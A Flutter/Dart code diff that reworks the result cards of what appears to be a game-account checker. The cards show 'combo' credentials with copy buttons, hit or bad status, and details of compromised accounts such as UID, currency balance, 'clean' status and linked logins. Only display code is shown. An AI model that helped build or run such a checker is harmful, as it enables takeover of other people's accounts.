+          border: Border.all(color: sc.withOpacity(.25)),
+        ),
+        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+          Row(children: [
+            Icon(si, color: sc, size: 15),
+            const SizedBox(width: 6),
+            Text(sl, style: TextStyle(color: sc, fontSize: 12, fontWeight: FontWeight.w700)),
+            const Spacer(),
+            // Copy combo
+            GestureDetector(
+              onTap: () {
+                Clipboard.setData(ClipboardData(text: r.combo));
+                HapticFeedback.selectionClick();
+              },
+              child: Icon(Icons.copy_rounded, color: sc.withOpacity(.7), size: 13),
+            ),
+          ]),
+          const SizedBox(height: 6),
+          Text(
+            r.combo,
+            style: TextStyle(color: c.textPrimary, fontSize: 11, fontFamily: 'monospace'),
+            maxLines: 1,
+            overflow: TextOverflow.ellipsis,
+          ),
+          if (r.status == _S.hit && r.nickname.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            const Divider(height: 1, color: Colors.white12),
+            const SizedBox(height: 8),
+            _row('🎮 IGN',     r.nickname.isNotEmpty ? r.nickname : '—', c),
+            _row('⚡ Level',   r.level.isNotEmpty    ? r.level    : '—', c),
+            _row('🌍 Region',  r.region.isNotEmpty   ? r.region   : '—', c),
+            _row('🆔 UID',     r.uid.isNotEmpty      ? r.uid      : '—', c),
+            _row('💎 Shells',  r.shell.isNotEmpty    ? r.shell    : '—', c),
+            _row('🌐 Country', r.country.isNotEmpty  ? r.country  : '—', c),
+            _row('🔒 Clean',   r.isClean             ? 'YES ✅'   : 'NO ❌', c),
+            if (r.binds.isNotEmpty)
+              _row('🔗 Binds', r.binds.join(', '), c),
+          ],
+          if (r.status == _S.noAccount && r.shell.isNotEmpty) ...[
+            const SizedBox(height: 8),
+            const Divider(height: 1, color: Colors.white12),
+            const SizedBox(height: 8),
+            _row('💎 Shells',  r.shell,   c),
+            _row('🌐 Country', r.country, c),
+            _row('🔒 Clean',   r.isClean ? 'YES ✅' : 'NO ❌', c),
+            if (r.binds.isNotEmpty)
+              _row('🔗 Binds', r.binds.join(', '), c),
+            _row('ℹ️ Note', r.detail, c),
+          ],
+          if ((r.status == _S.bad || r.status == _S.error) && r.detail.isNotEmpty) ...[
+            const SizedBox(height: 4),
+            Text(r.detail,
+                style: TextStyle(color: sc.withOpacity(.7), fontSize: 10)),
+          ],
+          // Long-press hint
+          const SizedBox(height: 4),
+          Text(
+            'Long-press to copy full details',
+            style: TextStyle(color: c.textHint.withOpacity(.5), fontSize: 9),
           ),
         ]),
-        const SizedBox(height: 6),
-        Text(
-          r.combo,
-          style: TextStyle(color: c.textPrimary, fontSize: 11, fontFamily: 'monospace'),
-          maxLines: 1,
-          overflow: TextOverflow.ellipsis,
-        ),
-        if (r.status == _S.hit && r.nickname.isNotEmpty) ...[
-          const SizedBox(height: 8),
-          const Divider(height: 1, color: Colors.white12),
-          const SizedBox(height: 8),
-          _row('🎮 IGN',     r.nickname.isNotEmpty ? r.nickname : '—', c),
-          _row('⚡ Level',   r.level.isNotEmpty    ? r.level    : '—', c),
-          _row('🌍 Region',  r.region.isNotEmpty   ? r.region   : '—', c),
-          _row('🆔 UID',     r.uid.isNotEmpty      ? r.uid      : '—', c),
-          _row('💎 Shells',  r.shell.isNotEmpty    ? r.shell    : '—', c),
-          _row('🌐 Country', r.country.isNotEmpty  ? r.country  : '—', c),
-          _row('🔒 Clean',   r.isClean             ? 'YES ✅'   : 'NO ❌', c),
-          if (r.binds.isNotEmpty)
-            _row('🔗 Binds', r.binds.join(', '), c),
-        ],
-        if (r.status == _S.noAccount && r.shell.isNotEmpty) ...[
-          const SizedBox(height: 8),
-          const Divider(height: 1, color: Colors.white12),
-          const SizedBox(height: 8),
-          _row('💎 Shells',  r.shell,   c),
-          _row('🌐 Country', r.country, c),
-          _row('🔒 Clean',   r.isClean ? 'YES ✅' : 'NO ❌', c),
-          if (r.binds.isNotEmpty)
-            _row('🔗 Binds', r.binds.join(', '), c),
-          _row('ℹ️ Note', r.detail, c),
-        ],
-        if ((r.status == _S.bad || r.status == _S.error) && r.detail.isNotEmpty) ...[
-          const SizedBox(height: 4),
-          Text(r.detail,
-              style: TextStyle(color: sc.withOpacity(.7), fontSize: 10)),
-        ],
-      ]),
+      ),
     );
   }
+
+  Widget _chip(String l, String v, Color color) => Expanded(
+    child: Column(children: [
+      Text(v, style: TextStyle(color: color, fontWeight: FontWeight.w800, fontSize: 13)),
+      Text(l, style: TextStyle(color: color.withOpacity(.7), fontSize: 9)),
+    ]),
+  );
+
+  Widget _div() => Container(height: 30, width: 1, color: Colors.white12);
 
   Widget _row(String l, String v, XissinColors c) => Padding(
     padding: const EdgeInsets.only(bottom: 3),
